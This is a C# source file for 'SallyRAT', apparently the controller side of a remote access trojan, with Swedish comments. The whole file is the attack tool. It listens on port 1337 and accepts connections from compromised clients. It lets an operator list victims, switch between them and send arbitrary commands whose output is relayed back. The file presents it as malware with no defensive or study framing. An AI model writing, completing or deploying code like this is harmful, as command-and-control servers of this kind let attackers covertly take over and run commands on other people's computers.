//Made by 262PR
//After connecting to client, you can switch between clients by typing "switch <ClientID>" (YOU NEED TO SWITCH IN THE BEGGINING OR BIG KABOOM) (In progress to fix)

using System;
using System.Collections.Concurrent;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Threading;

namespace SallyRAT
{
    class Program
    {
        // Trådsäker för att lagra alla anslutna klienter
        private static ConcurrentDictionary<string, TcpClient> connectedClients = new ConcurrentDictionary<string, TcpClient>();
        private static string currentClientId = null; // Variabel för att hålla reda på den för närvarande kontrollerade klienten

        static void Main(string[] args)
        {
            TcpListener listener = new TcpListener(IPAddress.Any, 1337); // Skapar en lyssnare på port 1337
            listener.Start();
            Console.WriteLine("Lyssnar på port 1337");

            // Startar en tråd för att hantera konsolkommandon
            Thread commandThread = new Thread(CommandLoop); // Startar en tråd för att hantera konsolkommandon
            commandThread.Start();

            while (true) // Denna loop körs tills programmet avslutas
            {
                try
                {
                    TcpClient client = listener.AcceptTcpClient(); // Accepterar en inkommande anslutning
                    string clientId = Guid.NewGuid().ToString().Substring(32); // Genererar ett unikt ID för klienten
                    connectedClients.TryAdd(clientId, client); // Lägger till klienten i listan

                    Console.WriteLine($"Klient {clientId} ansluten");

                    // Startar en ny tråd för att hantera klienten
                    Thread clientThread = new Thread(() => HandleClient(client, clientId)); // Startar en tråd för att hantera klienten
                    clientThread.Start();
                }
                catch (Exception e)
                {
                    Console.WriteLine($"Fel vid mottagning av klient: {e.Message}"); // Loggar eventuella fel
                }
            }
        }

        static void HandleClient(TcpClient client, string clientId)
        {
            NetworkStream stream = client.GetStream(); // Skapar en variabel för att skicka och ta emot data
            StreamReader reader = new StreamReader(stream); // Skapar en variabel för att läsa data
            StreamWriter writer = new StreamWriter(stream) { AutoFlush = true }; // Skapar en variabel för att skriva data

            try
            {
                while (client.Connected) // I denna loop skickas kommandon till klienten och mottar utdata
                {
                    if (clientId == currentClientId) // Hanterar endast kommandon om denna klient är den för närvarande kontrollerade
                    {
                        // Läser ett kommando från konsolen
                        string command = Console.ReadLine();
                        if (string.IsNullOrEmpty(command)) continue;

                        writer.WriteLine(command); // Skickar kommandot till klienten

                        string output;
                        while ((output = reader.ReadLine()) != null) // Läser klientens svar
                        {
                            if (output == "END_OF_OUTPUT") break; // Slutar läsa om slutet på utdata nås
                            Console.WriteLine($"Klient {clientId}: {output}"); // Loggar utdata från klienten
                        }
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"Fel vid hantering av klient {clientId}: {e.Message}"); // Loggar eventuella fel
            }
            finally
            {
                writer.Close();
                reader.Close();
                stream.Close();
                client.Close();
                connectedClients.TryRemove(clientId, out _); // Tar bort klienten från listan
                Console.WriteLine($"Klient {clientId} frånkopplad");
            }
        }

        static void CommandLoop()
        {
            while (true)
            {
                Console.Write("SallyRAT> ");
                string command = Console.ReadLine();

                if (string.IsNullOrEmpty(command)) continue;

                if (command.ToLower() == "showhelp")
                {
                    // Visar hjälpmeddelande
                    ShowHelp();
                }
                else if (command.ToLower() == "clients")
                {
                    // Listar alla anslutna klienter
                    foreach (var client in connectedClients)
                    {
                        Console.WriteLine($"Klient ID: {client.Key}");
                    }
                }
                else if (command.ToLower().StartsWith("switch "))
                {
                    // Växlar till en annan klient
                    string newClientId = command.Substring(7).Trim(); // Extraherar klient-ID från kommandot
                    if (connectedClients.ContainsKey(newClientId))
                    {
                        currentClientId = newClientId;
                        Console.WriteLine($"Kontroll växlad till klient {currentClientId}");
                    }
                    else
                    {
                        Console.WriteLine("Klient-ID hittades inte.");
                    }
                }
                else if (command.ToLower() == "exit")
                {
                    // Logik för avstängning
                    break;
                }
                else
                {
                    // Skickar kommando till den för närvarande kontrollerade klienten
                    SendCommandToClient(currentClientId, command);
                }
            }
        }

        static void ShowHelp()
        {
            Console.WriteLine("Tillgängliga kommandon:");
            Console.WriteLine("  showhelp          - Visar detta hjälpmeddelande.");
            Console.WriteLine("  clients           - Lista alla anslutna klienter.");
            Console.WriteLine("  switch <ClientID> - Växla kontroll till angiven klient.");
            Console.WriteLine("  exit              - Avsluta applikationen.");
        }

        static void SendCommandToClient(string clientId, string command)
        {
            if (connectedClients.TryGetValue(clientId, out TcpClient client))
            {
                try
                {
                    NetworkStream stream = client.GetStream();
                    StreamWriter writer = new StreamWriter(stream) { AutoFlush = true };
                    writer.WriteLine(command); // Skickar kommandot till klienten

                    StreamReader reader = new StreamReader(stream);
                    string output;
                    while ((output = reader.ReadLine()) != null) // Läser klientens svar
                    {
                        if (output == "END_OF_OUTPUT")
                        {
                            break;
                        }
                        Console.WriteLine($"Klient {clientId}: {output}"); // Loggar utdata från klienten
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine($"Fel vid kommunikation med klient {clientId}: {e.Message}"); // Loggar eventuella fel
                }
            }
            else
            {
                Console.WriteLine($"Klient {clientId} hittades inte.");
            }
        }
    }
}
